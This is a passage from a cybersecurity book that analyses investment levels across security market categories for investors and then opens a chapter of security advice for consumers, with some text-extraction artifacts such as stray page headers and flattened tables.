14-1. After Target’s mega-breach in 2013, the number  of new cybersecurity startups started increasing significantly up until  2017. However, the number of security companies founded from 2018  to 2019 significantly dropped as compared to previous years. The drop  continued in 2020 with only about 90 cybersecurity companies founded  in the first three quarters of the year. Although the immense drop in 2020  could be attributed to economic recession due to COVID-19, the number  of new cybersecurity companies founded in 2018 and 2019 represented  a significant decrease in cybersecurity startups. The market was likely  getting flooded with cybersecurity companies in reaction to the number of  big breaches taking place.  332   Chapter 14    adviCe to CyberseCurity investors  Figure 14-1.  Number of cybersecurity companies founded by year  from 2003 to 2019  Given the economic climate as of 2020 with the COVID-19 pandemic,   the growth of many companies was impacted. However, COVID-19  brought with it impact to information security, as it brought impact to  many aspects of the world. Rising numbers of remote workers coming  in from insecure, relatively unmanaged home routers and lack of VPN   virtual private network  bandwidth resulted in new cybersecurity  challenges. Some companies, for instance, resorted to using split tunneling  as a result of a lack of VPN bandwidth, and many CISOs have lost visibility.  They were not having all corporate traffic fully tunneled and backhauled  through all the enterprise defenses that they have invested in over the  years. As the world continues to evolve, the cybersecurity landscape will  continue to evolve with it.  As there are going to be more cybersecurity companies to come,  the natural question that arises is: what should those companies be  doing? The answer lies at the intersection of what big cybersecurity   333   Chapter 14    adviCe to CyberseCurity investors  needs the market has and what is already being covered relatively well  by incumbent cybersecurity companies. We will first focus on the latter  question by analyzing investments to date. Then, we’ll analyze areas where  investments to date probably have not been sufficient.   Investment Factors While many data breaches can be avoided by just getting the basics of  information security right, there is a saying in our field: “Attacks only get  better.” Organized cybercriminals and nation-state actors relentlessly  continue to develop more sophisticated attacks, and we need to always  be innovating and coming up with new and better defenses to proactively  anticipate novel attacks.  There are a few key factors that need to be considered to understand  which specific areas of cybersecurity need the most additional funding.  They are    1   Market size need: The cybersecurity market,  overall, is a large market. Well-known industry  analyst groups IDC and Gartner both estimated  cybersecurity market spend to be more than $100  billion annually for 2019. IDC estimated $103  billion, while Gartner estimated $124 billion. One  can look at breakdowns of the expected market size  for sub-areas of security as an indicator of market  need for those sub-areas. Although that might be  useful to do for larger sub-areas of security, it may  be harder to reliably use such statistics for growing  areas of cybersecurity. Hence, while existing  expected market need is one factor, we also look at  expected future trends.  334   Chapter 14    adviCe to CyberseCurity investors    2   Investments to date: Even if there is a sizable   existing market need for a particular area of security,  further investment in that area may not be as critical  as in other areas where there has been less historical  investment. With this in mind, we look at the  amount invested to date in a particular area.    3   Root causes of breaches: Although the existing   security market may be heading in particular  directions, future breaches may occur for reasons  that may not be getting proportionately addressed  by current directions. Also, understanding the root  causes for past breaches and whether or not current  market directions are addressing those root causes  sufficiently can be important.    4   Expected future trends: While no one has a crystal  ball, one can speculate about areas of cybersecurity  that are likely to experience significant growth  based on technological trends, market trends, and  evolution of an attacker’s goals. I’ll comment on  future trends throughout in the discussion that  follows.  We now cover the preceding factors in detail and discuss what we can  learn about which areas of cybersecurity need further investment, which  may not, and why.   Market Size Need Table 14-1 shows Gartner’s estimate of total market size broken down by  category. Note that we will see that while Gartner uses some of the same  category names that Crunchbase uses, their definitions of these categories   335   Chapter 14    adviCe to CyberseCurity investors  are unlikely to be an exact match. That said, it may nevertheless be  interesting to see what we can learn from Gartner’s assessment of market  need in an area and Crunchbase’s assessment of investment to date in a  particular area, even if the category match may be “fuzzy.”   Table 14-1.

When a private  equity investment takes place, a venture capital or private equity firm is  given stock in the company, and the company is given capital to spend on  growing its business. When an IPO  initial public offering  takes place, a  company that was previously private allows the public to buy its stock in  exchange for capital. Both private equity investments and IPOs result in  more funding for a company, and both types of investment are reflected in  the aggregate figures in Table 14-2.  Table 14-2.

That is, a single company can be assigned multiple categories,  such as “Network Security” and “Artificial Intelligence.” When a company  is assigned multiple categories, as was the case with the overwhelming  majority  94%  of them, it is an indication that the amount of funding that  went into the company is being invested in those category areas. However,  since it is unclear as to how much a particular company might be focusing  on, say, Network Security as compared to, say, Artificial Intelligence, I  do not make an attempt to guess. As such, one should not expect that   11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  338   Chapter 14    adviCe to CyberseCurity investors  summing up all the dollar amounts invested in the categories will sum up  to $45 billion, the total funding amount that has gone into all companies.  Also, while I show 25 categories in Table 14-2, note that it is not strictly  the top 25 categories that Crunchbase used. As some categories were  superfluous or not useful  e.g., “Software”  for the analysis, they have  been excluded from Table 14-2. Especially with regard to categories with  under $1 billion of investment attributed to them thus far, I report on only  a subset of such categories that I felt were most interesting. That said,  I focused on a subset of the top 150 categories where there was at least  $100M in funding to date in the area, and I felt there was something to be  learned from the category and its level of funding to date.  There was a  total of over 500 categories in the data set.    Network Security  Network security  including intrusion detection  is the most highly  invested category. Firewalls are an example of a network security  technology that have been around for the longest time. While they are a  necessary but not sufficient basic defense, every six to seven years there  have been new challengers to the prior generation of firewalls. Some of  the earliest firewall companies were Checkpoint and Netscreen. They gave  way to Palo Alto Networks, ZScaler, and FireEye Mandiant. Approximately  $11.3 billion has been invested in network security technologies, including  firewalls.   Cloud Security  As organizations have been moving more and more systems to the “cloud”  in data centers run by Amazon, Microsoft, and Google, among other  competitors, a generation of cybersecurity companies has started to  help provide defenses for such systems. Some of these companies have  been acquired by cloud providers, and it remains to be seen if there may  perhaps be room for such companies to exist independently. That said, it   339   Chapter 14    adviCe to CyberseCurity investors  also remains to be seen if cloud providers can offer the full stack of security  services required, ranging from the analog of on-premise firewalls to  application layer defenses. Approximately $10.4 billion has been invested  in cloud security, not including private investments made by the cloud  providers themselves. As that amount is on par with the investments made  into network security, it is possible that such level of investment could be  sufficient to date.  Mobile Security  Mobile security is a category that has been attributed to $7 billion worth  of investment. Such investment is more than half of the amount that has  gone into network security. In the mid- to late 2000s, there was quite a bit  of fanfare about the growth of the mobile device market and the looming  security issues that mobile devices and mobile apps could cause. Mobile  device management companies were all the rage, and various services that  could scan mobile apps for security and privacy issues started to appear on  the market.  Proactive adoption and deployment of mobile security technology   have resulted in a world in which mobile devices and vulnerabilities due  to them are not a major root cause of breaches. Apple and Google employ  multiple forms of both manual and automated scanning of mobile apps  on their corresponding app stores. Although their defenses are definitely  not perfect and there have been various published works  some by yours  truly2  on their limitations, we have also seen that mobile security issues  are certainly not among the top six technical root causes of breaches that  we covered in Chapter 1. However, as mobile phones continue to become  more prevalent as our “first screens,” more investment may be required  going forward. Investment that was previously made in defenses that   2 Eisenhaur, G., Gagnon, M.N., Demir, T., & Daswani, N.  2011 . Mobile Malware  Madness and How to Cap the Mad Hatters: A Preliminary Look at Mitigating  Mobile Malware.  340   Chapter 14    adviCe to CyberseCurity investors  protect desktop and laptop computers should likely be transitioned to  mobile phone defenses. Phishing, malware, and other forms of attack are  likely to impact mobile phone users more going forward  even if they have  not specifically been as much of an issue in the past . As such, it is likely  that mobile security is a “sufficiently invested” category to date but may  need further investment in the future.  Table 14-3.  Cloud and Mobile Security Investment  Category  Approx $  Invested  Comments  Cloud security  $10.4b  there has been significant investment, but slightly  less than network security  $11b , not including  investments by major cloud computing providers  amazon, Microsoft, and Google themselves.  Mobile security is not specifically one of the major  root causes of breaches  yet  and seems sufficient  compared to categories such as network security   $11b . as mobile phones continue to become  more prevalent as our “first screens” though,  more investment may be required going forward.  Mobile security  $7.0b   Market Size vs. Investment to Date  For some of the largest areas of 2019 market size, I have shown the total  invested from 2003 to 2019 in Table 14-4. The network security market  is quite a mature market with $13.3 billion spent annually and $11.2  billion invested over a 16-year period. By comparison, the market size  of cloud security seems very small at only $500 million annually. That  figure is expected to grow quickly over the next few years, but still seems  small compared to the $10.4 billion invested in companies that are either   341   Chapter 14    adviCe to CyberseCurity investors  working on cloud security or doing something tangential enough to the  area to be attributed with a cloud security categorization. Competing  industry analyst firm Forrester reports that cloud security spending is  much larger for 2019, though, and could be expected to grow to $12 billion  by 2023.3 Looking at the market size for cloud security annually, one might  hypothesize that investment in cloud security may be sufficient to date or  even possibly overinvested to date until the actual annual market size and  demand for cloud security grows.  Table 14-4.  Comparison of Forrester Market Size to Total Invested for  Selected Categories  Market Size, Billions $  2019   Total Invested, Billions $  2003–2019   network security  Cloud security  identity and access  Management  risk Management  Consumer security software  13.3  0.5  10.6  4.7  6.6  11.3  10.4  3.2  1.3  0.7  Identity and access management, like network security, is a large,  stable sub-area of security with $10.6 billion spent in 2019. There has  been a relatively small amount of $3.2 billion invested in the area over the  16-year period. Similarly, for Risk Management, there has been relatively  a small amount invested compared to the annual spend, with an annual  spend of $4.7 billion and only $1.3 billion invested. For both Identity  and Access Management and Risk Management, I would hypothesize   3 www.infosecurity-magazine.com news cloud-security-spending-  set-to-top   342   Chapter 14    adviCe to CyberseCurity investors  that these areas are ripe for additional entrants into the market. Finally,  Consumer Security Software has not received much private equity  investment in the 16-year period but may be ripe for disruption as the  market size is nine times the amount of investment, the largest ratio of  market size to total invested of any of the categories previously discussed.   Overinvested Areas  Two areas that seem overinvested include blockchain  $6.1B  and  cryptocurrency  $5.9B , as per Table 14-5. In particular, I would make an  educated guess that more money has been invested in these areas than  seems necessary to date, and I will discuss why shortly. I would guess  that we should generally keep an eye out for further returns from the  investments made thus far in these areas before investing more. At the  same time, if some truly revolutionary startup comes together in one of  these areas that is so above the bar with regard to its potential to make  impact, it may deserve further investment, but one would have to be quite  convinced against a backdrop of so much already invested.  Table 14-5.  Possible Overinvested Categories  Category  Approx $  Invested  Comments  blockchain  $6.1b  no one “killer app” apparent, aside from bitcoin to  date. by comparison, within just a few years after  the birth of tCp ip, email arose as a killer app. at the  same time, the Web took two decades, so we should  monitor over the coming decades to determine what  additional investments are warranted.  even 10 years after the birth of bitcoin, no other  virtual currency has achieved similar dominance.  343  Cryptocurrencies $5.9b   Chapter 14    adviCe to CyberseCurity investors  Blockchain and Cryptocurrency  Note that blockchain and cryptocurrencies have been split out separately  in our tables. Many cryptocurrencies are built on blockchains. Blockchain  is a technology that allows one to securely maintain a distributed ledger  of transactions, and blockchains can be used for many different types of  transactions. Cryptocurrencies use blockchains to track transfers of digital  currency, but blockchains can more generally be used to track contracts of  all sorts.  Blockchains may indeed have many applications beyond   cryptocurrencies, but it is unclear as to why most systems might require  the level of decentralization that blockchains have to offer. I would argue  that many such applications can be possible with a more centralized  architecture in which at least some small number of parties trust each  other. Certainly, Bitcoin has also evolved over time to a state in which  there are a relatively small number of parties that can control the currency  should they decide to collude.  That said, the reason for my “overinvested” hypothesis for blockchain   and cryptocurrency is that there does not seem to be many “killer apps”  that have achieved mainstream usage, either in consumer or business  settings. Although the Bitcoin currency has been quite successful and is  deeply technically interesting, mainstream consumers and businesses  do not transact in Bitcoin, as of the writing of this book. Bitcoin has been  successful in representing a relatively small, single-digit percentage of the  value of the world’s gold and an even smaller percentage of the world’s  currency. As of the writing of this book, there does not seem to be any  other blockchain initiative that has achieved a significant fraction of what  Bitcoin has achieved.  Some cryptocurrencies are catching up to Bitcoin,  but I am not aware of any non-cryptocurrency blockchain applications  that have enjoyed a similar level of success.   While there is an overlap of more than $2 billion invested in   companies that have been attributed both Blockchain and Cryptocurrency   344   Chapter 14    adviCe to CyberseCurity investors  categorizations, I list both categories separately as there is an important  distinction between the underlying technology  blockchain  and an  application of it  cryptocurrency . Both blockchain and cryptocurrency are  likely overinvested, though, at least for the moment until more killer apps  arise and we see further impact from investments to date.  By comparison, almost immediately after the formalization of TCP   IP  the protocol suite upon which the entire Internet is based , email  arose in the form of the Simple Mail Transfer Protocol as a killer app, and  advancements that enabled the Web as we know it today  including the  Domain Name System  emerged relatively quickly thereafter. At the same  time, the Web as we know it took another decade to mature and start  commercialization, so we should monitor over the coming decades to  determine what additional investments are warranted in the blockchain  and cryptocurrency space.   Underfunded Areas Most other areas in security that I now discuss seem underfunded based  on the amount of investment that has been made to date and based on  what the market will most likely need in the next several years. We discuss  a few of these areas and why they are likely underfunded to date.   Artificial Intelligence  Approximately $7.7 billion of investment has been made to date in  applications of artificial intelligence  AI , machine learning  ML , and  natural language processing  NLP  to security. As there are not enough  security analysts to manually look at alerts generated by defensive systems,  there is a deep need to automate the processing of such alerts, and  technologies such as AI and ML can help eliminate the need for as many  security analysts.  345   Chapter 14    adviCe to CyberseCurity investors  Back in the early 1900s, many companies used to hire electrical   engineers and keep them on staff in order to keep the electricity coming  in. Today, electricity is a utility in which power companies keep electrical  engineers on staff, and most companies can rely on the power companies  to keep the electricity coming in. Such may occur with security analysts  and engineers as well. Managed Security Service Providers  MSSPs  may  be contracted by most companies, and they may use a combination of  both automating many of the entry-level security analyst positions away  and keeping more talented “second-level” security analysts and engineers  on their staff to provide managed security services as a utility to other  organizations. The bulk of the security market  $64 billion out of $124  billion  in 2019 as per Gartner is in fact made up of MSSPs and security  consulting services, potentially exhibiting a trend toward outsourced  security and a utility-like model. Although spending on MSSPs has  varied over time, it is possible that over the long term only the largest  of companies will hire information security teams that number in the  hundreds of employees and manage the bulk of their security operations  in-house, and the bulk of companies will rely more on MSSPs.  As there is a short supply of security analysts and professionals, there   has been significant investment in applications of AI ML to security to  automate detection, attack containment, incident response, and recovery.  As we had seen in the Target breach in 2013, Target was a FireEye customer  and was seeing malware detections from their FireEye devices. Although  those detections were being forwarded from their India-based team to  their US-based team, there were too many such alerts that were mistaken  for noise and could not be processed by the US-based team fast enough to  stop the attack. Further investment in applications of AI can help in both  eliminating the noise and detecting actual attacks with higher fidelity,  also while using much less staff. Such automation through AI ML will be  employed both by the largest of companies and the MSSPs that supply  security services for the majority of the rest of the world.  346   Chapter 14    adviCe to CyberseCurity investors  In addition to leveraging AI ML to automate security systems,   investment will also be required to ensure that AI ML systems cannot  be abused or taken advantage of by attackers. In one example, machine  learning systems can be used to recognize particular human faces  based on input from a camera, but an attacker can wear a set of special  sunglasses such that when the attacker looks at the camera, the ML system  misclassifies the attacker as another person. In the field of computer  science, such attacks are called “adversarial machine learning” attacks,  and as AI ML systems will be used in applications ranging from automated  driving to surveillance, further investment will be required to defend AI ML  systems from such attacks. AI ML systems were typically developed with  the assumptions that algorithm training and classification tasks are done  based on “good” input, and not input that may be bad or adversarial, as will  inevitably occur when such algorithms are used for security applications.  Adversarial machine learning focuses on the security of machine   learning  security of ML  instead of using machine learning for security   ML for security . Most of the $7.7 billion of investment has been made to  date in applications of artificial intelligence  AI  to security  such as ML  for security , as opposed to security of AI ML. Given that many consumer  and enterprise systems ranging from autonomous driving to cyber defense  are leveraging more and more artificial intelligence techniques, it is  important to defend such techniques from adversarial input that could  pierce AI-based defenses. Key threats to AI-based defenses include input  manipulation, training data manipulation, model manipulation, input  extraction, training data extraction, and model extraction.4 The interested  reader is referred to “The Top 10 Risks of Machine Learning Security” by  Gary McGraw, Richie Bonett, Harold Figueroa, and Victor Shepardson of  the Berryville Institute of Machine Learning.5  4 Security Engineering for Machine Learning.

As a former CISO, such analytics are critical in  helping direct where future investments in a security program should go.  For instance, if security analytics from a SIEM  security incident and event  management  platform identify that particular adversaries are targeting  an organization using a particular set of methodologies and techniques,  one can use that information to beef up specific defenses that thwart such  adversaries, as a complement to general defenses and countermeasures. However, of the $45 billion that has been invested in cybersecurity,  only $4.0 billion has been invested in Analytics. Given the thousands of  breaches that have been taking place, including many dozens of mega- breaches, one might argue that as an industry we are still searching in  the dark. Although we have outlined six key technical root causes in this  book, every organization is different and may have different levels of  susceptibility to the root causes. As such, security analytics tools have  the potential to provide CISOs and other security leaders hard data and  business intelligence types of analytics to help direct their spending  decisions. CEOs typically have business intelligence teams that help  aggregate and present analytical data about a business such that the CEO  can make data-driven decisions about how to increase revenue and grow  a company. Shouldn’t CISOs have similar tools and analytics at their  disposal to help mitigate risk?  As a CISO, when I had to prepare a budget for the following year, I   would sometimes employ consultants to interview more staff than I could  on my own to gather input on where future spending should go and why.  I was surprised with the relative lack of data that would come from our  security tools and the reliance that we had on the expertise in the heads of  our most senior staff. That is not to say that we should not leverage such  human expertise, but the balance definitely seemed off—I feel that such   349   Chapter 14    adviCe to CyberseCurity investors  expert analysis should be based on both a combination of senior staff  expertise and data from the security tools that are monitoring, detecting,  and blocking attacks. Senior staff may be the best bet for helping fill in  where we think we might be missing potential attacks  false negatives , but  certainly analytics and hard data around what attacks are being attempted   true positives  should also be part of the equation.  As such, I believe that more can be fruitfully invested in security   analytics to help make better decisions around where security program  budget should be spent going forward.   Big Data and Database Security  Big Data and Database Security is an area for future investment with $2.9  billion attributed to it thus far. Through the 1980s and 1990s, most data that  was stored in databases was of the form that can neatly be organized into  tables and relations in which one or more table columns were functionally  dependent on special columns called keys. Such databases were called  relational databases as the columns of the tables that stored data were  relationally structured in nature, and Structured Query Language   SQL  was the language of choice used to query or interact with such  databases. Database security implementation typically involved specifying  authorization, access controls, and confidentiality requirements in the  form of SQL statements, in addition to the operating system and network  layer security controls around the databases themselves.  Starting in the early 2000s, with more and more of the world’s data   being semi-structured  as opposed to fully structured neatly in tables , in  the form of web pages, XML  Extensible Markup Language  documents,  JSON  JavaScript Object Notation , audio, and videos, semi-structured  databases quickly grew in popularity. Most of the world’s data  simply  in terms of the amount of petabytes stored  may eventually be stored in  semi-structured databases  if that is not already the case , and as such  implementation of security for such data is of growing importance.  350   Chapter 14    adviCe to CyberseCurity investors  Systems such as Hadoop, an open source implementation of  MapReduce, a programming paradigm used for processing semi-  structured data, were originally not built with security designed in. Much  work to support basic authentication as well as access controls for data  stored on Hadoop systems had to be done in the late 2000s. Hadoop is also  just one of many such types of systems that support computation on Big  Data. Cassandra, MongoDB, CouchDB, and Redis are other such systems.  Although attackers have been able to steal billions of records from  relational databases, there is no reason to believe they are going to stop  there. In 2017, for instance, tens of thousands of MongoDB databases  holding as much as 93 terabytes of data7 were compromised and encrypted  by ransomware, simply because the default communication channels  that MongoDB used to talk to its administrators were left open and  unauthenticated. Most of these MongoDB servers were hosted on the  Amazon Web Services platform  making them easy for attackers to search  for  and also had a default insecure configuration. As such, I believe that it  is unlikely that all holes in these fairly new  e.g., less than a couple decades  old  databases have been found, fixed, and forward- guarded against.  Further investment in Big Data and Database Security will be worthwhile.   Social Media and Online Advertising Security  Social Media and Online Advertising Security has a special place in my   Neil’s  heart as I have worked both at Google and at Twitter in the past.  After my time at Google, I co-founded a company by the name of Dasient  that was focused on helping protect the largest ad networks from malicious  advertising, or malvertising. Ads that conduct malvertising simply infect  desktops and mobile devices via malware drive-by-downloads when they   7 www.bankinfosecurity.com mongodb-ransomware-compromises-double-  in-day-a-9625  351   Chapter 14    adviCe to CyberseCurity investors  are simply loaded and viewed—no user interaction or social engineering  required.  Dasient was acquired by Twitter, and I spent my first year at Twitter   focused on helping defend its advertising systems from click fraud. I then  spent two years after that building an internal threat intelligence platform  that would identify malicious links  drive-by-downloads, phishing,  “regular” malware, etc.  that might appear in any of the 500 million tweets  that would be posted per day.  Approximately one out of five tweets had a  link of some sort, and the systems that we built would determine whether  or not those links might pose phishing, malware, or other threats to the  user.   In my work at Twitter, I would also collaborate with security engineers,  product managers, and CISOs at other social media companies including  Facebook, Google, and Yahoo as we worked to protect the entire ecosystem  from a whole variety of security threats. Alas, the job was bigger than I  think any of us could have predicted. I left Twitter in early 2015 to take on  the CISO role at LifeLock.  Although the online advertising ecosystem has made progress in   fighting threats such as malvertising and click fraud, I am not quite sure  that anyone predicted that ads used for political purposes  including  disinformation and misinformation campaigns  could have had as much  impact as they did. And it is not just about government and politics. There  is no reason that corporations do not target each other in such campaigns.  In addition, video content can be relatively easily created or manipulated  these days. “Deep fake” videos, in which videos are created, altered, and  or heavily edited, can be made to seem authentic and used to achieve  propaganda goals.  Some might argue  and I would agree  that the trustworthiness of   information needs to become a security goal, just like confidentiality and  basic message and data integrity have been. Trustworthiness is, of course,  a much thornier topic from a technical perspective. As such, further  investment is probably required in Social Media and Online Advertising  Security. My expectedly biased view on this topic is that the $1.8 billion   352   Chapter 14    adviCe to CyberseCurity investors  that has been invested in companies that touch the topic of social media  and online advertising security is probably just the tip of the iceberg in  terms of what will be needed going forward.   Privacy  Privacy is another category for future, more aggressive investment given  the mere $1.6 billion invested in the 17-year period. Facebook’s fine of $5  billion alone  imposed by the Federal Trade Commission in 2019  is more  than three times the amount that has been invested in startups that have a  Privacy categorization attributed to them. While some of the largest high- tech players such as Facebook and Google are making significant internal  investments in privacy, the GDPR  General Data Protection Regulation   that they are working to satisfy applies to all businesses that have data  about EU citizens. California has passed similar such privacy regulation in  the form of the CCPA  California Consumer Privacy Act , and other states  may follow suit. Even with huge security and privacy teams, some of the  largest social media sites have found it challenging to comply, based on  the magnitude and number of fines that have been imposed to date. The  average organization will need tools and help if they hope to comply as  well. As such, I believe that further funding  or at the absolute least, further  focus  on Privacy from startups that are already in the cybersecurity space  will be required.   Fraud Detection  Fraud Detection is another area for further investment, with $1.6 billion  currently invested thus far. The FBI reported in 2019 that there was $2.7  billion in fraud in that year alone, and the number rose to that from  previous years. There is therefore more fraud generally taking place every  year than dollars invested to solve the problem over the 17-year period  from 2003 to 2020. Note that the $1.6 billion figure does not include private  investments that banks and other financial institutions make in internal   353   Chapter 14    adviCe to CyberseCurity investors  fraud management departments and technologies. Also, given the amount  of existing fraud, credit card companies make the assumption that there  will be billions of dollars of fraud per year as part of their business model.  Although they have been accounting for fraud taking place as part of their  business model, there is much room for improvement. If every dollar that  is invested in reducing fraud can eliminate $10 of fraud every year ongoing,  those dollars are likely very worthwhile investments. As such, I believe that  fraud detection is another area ripe for future investment.   IoT Security  I mentioned IoT security in the introduction of this chapter as an  underinvested category. Devices connected to the Internet first included  minicomputers, then servers, then desktops, then mobile devices. The  next wave of devices to be connected to the Internet will be the billions of  web cameras, Alexas  voice command , Nest thermostats, Ring doorbells,  home security systems, fitness devices, and wearable computers, among  many others. These devices often have CPU power and other resources,  but are not always being designed with security in mind. Such devices  historically have not always had the ability to be patched should security  vulnerabilities be found at some point and as a result significantly change  the security landscape on the Internet.  The Mirai botnet of 2016 took some of the largest sites on the Internet  offline with a distributed denial-of-service attack conducted by hundreds  of thousands of compromised IoT devices and was one of the first big  examples of how important it is to secure IoT devices. Since the Mirai  botnet attack, many variants of it have continued to appear, even if their  impact has not been as significant. It is possible that the Mirai botnet  attack could be as significant for the Internet of Things as the Morris  Worm, one of the first network worms to ever propagate on the Internet,  was in 1988.  354   Chapter 14    adviCe to CyberseCurity investors  One of the main challenges in securing IoT devices is that they are   often produced by manufacturers who are working to absolutely minimize  the cost of the devices and at this early stage determine the potential  market viability of their relatively new IoT device. Achieving security while  also keeping costs low, maintaining convenience, and allowing for fast  innovation has always been a challenge. Such challenges are worthwhile  technical and business problems for new cybersecurity startups to focus  on.  Internet of Things security has received $1.3 billion of investment.  Given the overall growth in IoT devices expected in the coming years,  one might expect that a level of investment commensurate with network  security may be eventually required.   Additional Underfunded Areas  Finally, some areas to note into which less than $100 million of investment  has gone thus far include drone security, virtual reality security, and  quantum computing security. Those seem like exciting areas in which  further investment will most likely be necessary, but the market need is far  off enough that most startups would be concerned about the immediate  market size and revenue opportunity. As has happened in many other  areas  web security, IoT security, etc. , security investment may ramp up  only once significant hacks or breaches occur with drones, virtual reality  systems, and quantum computing! Unfortunately, history tells us that  the world generally tends to be reactive when it comes to security, with  significant amounts of investments being made only after breaches and  hacks occur.  355   Chapter 14    adviCe to CyberseCurity investors   Root Causes When I started doing research on cybersecurity investments, I was  hoping to determine how much investment to date had been made into  addressing the top six technical root causes of data breaches outlined in  Chapter 1. The categories used on Crunchbase were significantly broader  than most of the technical root causes: unencrypted data, phishing,  malware, third-party risks, software vulnerabilities, and inadvertent  employee mistakes. Some categories seem to be a superset of some of the  technical root causes. For instance, Email Security is a superset that can  help address phishing. That said, the Email Security categorization was not  attributed to enough cybersecurity companies to account for even $500  million in investments, which suggests the categorization was not being  used effectively in the data set.  In an attempt to identify the sets of cybersecurity startups that help   address the root causes of breaches, I then turned to the descriptions  of the companies in the Crunchbase data set. An example of such a  description from the data set was “Agari provides email threat prevention  and protection service leverages AI cybersecurity to protect organization.”  Interestingly enough, while Agari is a well-known email security startup  that helps organizations leverage the DKIM and DMARC security  standards to prevent their domain names from being used by phishers, the  Email Security category was not attributed to the company. In addition,  it was a little disappointing that the description was not grammatically  correct. Although the Crunchbase data are definitely not perfect by any  means, there is much that we have been able to learn from them thus far. Looking at the most frequently used words in cybersecurity company   descriptions  eliminating “stop words” , the results were as shown in  Table 14-8.  356   Chapter 14    adviCe to CyberseCurity investors  Table 14-8.  Cybersecurity  Company Description Analysis  Word  Number of Companies  security  platform  solutions  data  services  software  technology  blockchain  Mobile  network  1098  538  421  352  283  278  277  275  214  180  It seems that most cybersecurity companies therefore seek to be   “platforms” and “solutions” as do many other enterprise software  companies. Some types of cybersecurity companies do seem to focus on  domain-specific areas, such as blockchain, mobile, or network security. Instead of just looking for companies that may address root causes   based on the most frequently used words in descriptions, I ran searches  for specific terms that may be indicative of a company that focuses on root  causes, and Table 14-9 shows the results.  357   Chapter 14    adviCe to CyberseCurity investors  Table 14-9.  Root Causes in Company Descriptions  Root Cause  Words Terms  phishing  Malware  phishing, anti-phishing, email,  [multi two]-factor  Malware, anti-malware, virus,  rootkit, ransomware  encryption  encryption  third-party compromise or abuse  third  software vulnerabilities  vulnerability  inadvertent mistakes  human, humans, human-centric 16  Number of  Companies  61  47  34  10  17  Out of all the companies, less than a total of 5% of them typically   describe themselves in a way that is focused on what they do to address the  root causes of breaches. As companies may want to attempt to be as broad  as possible, they can be fairly generic in terms of their descriptions.   Summary My advice to CISOs as well as VCs is to focus on the root causes of  breaches. CISOs can get inundated with security vendor marketing or can  sometimes get overly focused on checking the many, many boxes required  to achieve a compliance bar. Compliance, however, is not synonymous  with secure. In fact, most companies that get breached can usually  produce their annual certificates of compliance. Sometimes compliance  standards committees may then retroactively work to show that the  breached organization actually was not compliant, in an attempt to show  that their compliance certificate is actually meaningful. In addition, most  of the items on compliance checklists could potentially be baggage from  standards that are designed by committee.  358   Chapter 14    adviCe to CyberseCurity investors  Venture capitalists should invest in areas that are underinvested and   address root causes as well as avoid areas in which there has already  been much market hype. Focusing on root causes can help avoid the  overwhelming majority of breaches, and compliance can mostly be  achieved as a side effect of good IT, product, and information security  hygiene.  359   CHAPTER 15  Advice to Consumers  The root causes of breach that we outlined in Chapter 1 are responsible for  security breaches across industries and in both enterprise and government  entities. But what’s more troubling is that these breaches are often the  result of an organization’s insufficient actions or failure to take action  to fully address the causes. In this chapter, we turn our focus to the rest  of us, from enterprises to consumers. We will use the term consumer to  reflect the reality that we not only consume physical goods and services  but also digital content and services at an ever-accelerating rate. The  Internet, wearables, and mobile apps have become an integral part of our  lives. These devices even help us while we sleep by measuring our heart  rate, quality of sleep, and even our brain waves. We are woken up by our  alerts and status check-ins, reminded to meditate or exercise, and even  coached on what to eat and how much water to consume in one day by our  smartphones. It’s clear that the digital world helps manage many aspects  of our lives.  What we don’t often reflect on is the reality that it is also shaping   who we are. If you ever want to see just how dependent we’ve become  on consumer technology, try turning off the Internet at home or put your  phone in airplane mode for a mere 24 hours! The most irate customers  and lowest customer satisfaction scores are directed at the major Internet  providers. This means that all of the data that we generate is no longer  trivial or basic content. What is now at risk goes far beyond our favorite  secret smoked brisket recipe! The more the digital converges with our  physical lives, the more the data becomes sensitive and private.    Neil Daswani and Moudy Elbayadi 2021  N. Daswani and M. Elbayadi, Big Breaches, https:  doi.org 10.1007 978-1-4842-6655-7_15  361   Chapter 15    adviCe to Consumers  We have described what happens when organizations are either   negligent or failed in some way in protecting information—our critical  data. Often as a result of a lack of countermeasures to defend against the  technical root causes of breach, enterprises fall victim to cyberattacks. The  same technical root causes—phishing, malware, software vulnerabilities,  third-party risks, unencrypted data, and inadvertent mistakes—can wreak  havoc to a consumer’s security. In this chapter, we provide a checklist of  the eight principal things that consumers need to do to protect themselves  and their data from breaches.   Our Role as Consumers As consumers, there are several basic actions we can take to protect our  data from malicious actors. Just as consumers can put on their seatbelts  before driving a car to protect themselves, there are a set of actions they  can take to protect themselves online. In the still relatively nascent online  world, there are hundreds of things that consumers can potentially do. We  focus on eight that arguably have some of the biggest impact to defend  consumers from the technical root causes of breach that have impacted  enterprises. Over time, as the consumer technology sector evolves, we  hope to see the size of the checklist reduce down from eight to one or two,  but it unfortunately may take a decade or two to get there.   Seatbelts for Our Digital Lives Despite the risk of a life-threatening accident, we still drive cars to get  around. Accidents can be due to inadvertent mistakes or misjudgment by  other drivers, drunk drivers, or outright malicious drivers  e.g., a terrorist  driving a truck carrying a bomb . We wear seatbelts each time we drive,  because we know there is a chance that we might get into a life-threatening  car accident. The risk of injury or death is always present. Similarly, we   362   Chapter 15    adviCe to Consumers  accept there will always be risks online due to inadvertent data exposure  by enterprises and due to malicious actors. There will always be malicious  people, waking up every morning thinking about how to steal, defraud,  and harm others for profit or other causes. But this stark reality of  inadvertent data exposures and cybercriminals carrying out data breaches  does not mean we have to make these events easy for them to cause us  harm. We are convinced that by taking some of the actions described in  this chapter and perhaps proactively spending just a few hours per year  can help avoid many hours of lost productivity and thousands of dollars or  more. We believe the time spent on improving your own security posture is  a great investment and will protect you and your family for the long run.   The Danger Is Real In the United States, 61% of consumers surveyed said they’ve experienced  cybercrime at least once, with 43% having experienced a cybercrime in  the past 12 months alone. These statistics were published in the 2019  research report conducted by the Harris Poll on behalf of NortonLifeLock.1  The danger to all of us consumers is real, and not imagined. And, whereas  corporations have access to security professionals and more capital and  tools, we lack those resources in our personal lives. Each day, real damage  is done that impacts a consumer’s identity, funds, and life savings and,  now with increased working from home, impacts your ability to perform  your duties and obligations for your organizations. During our time  working at LifeLock, a leading identity protection service, we saw new  customers adopt the service because of the pain and suffering that they  experienced from cybercriminals taking advantage of them. Many called   1 https:  investor.nortonlifelock.com About Investors press-releases  press-release-details 2020 More-Americans-Hold-Themselves- Accountable-for-Protecting-Privacy-Than-They-Do-Government default. aspx  363   Chapter 15    adviCe to Consumers  us to inquire about digital protection after the incident had taken place.  Unfortunately, the damage was already done—our member 